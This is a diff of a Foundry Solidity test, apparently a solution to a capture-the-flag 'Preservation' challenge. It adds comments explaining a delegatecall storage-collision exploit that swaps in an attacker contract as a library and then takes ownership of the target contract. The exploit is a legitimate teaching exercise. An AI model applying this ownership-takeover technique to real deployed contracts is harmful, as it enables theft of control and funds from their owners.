@@ -27,16 +27,19 @@ contract TestPreservation is Test {
     }
 
     function testPreservation() public {
+        // it will set `16-Preversation:timeZone1Library` to `attackerContract` address 
         vm.prank(attacker);
         target.setFirstTime(uint256(uint160(address(attackerContract))));
 
+        // verify above statement
         assertEq(target.timeZone1Library() , address(attackerContract));
 
+        // it will set the `16-Preservation:owner` to `tx.origin` which is attacker's wallet address
         vm.prank(attacker, attacker);
         target.setFirstTime(0);
-
         console.log(attackerContract.owner());
 
+        // the owner is attacker's wallet
         assertEq(target.owner() , attacker);
     }
 }
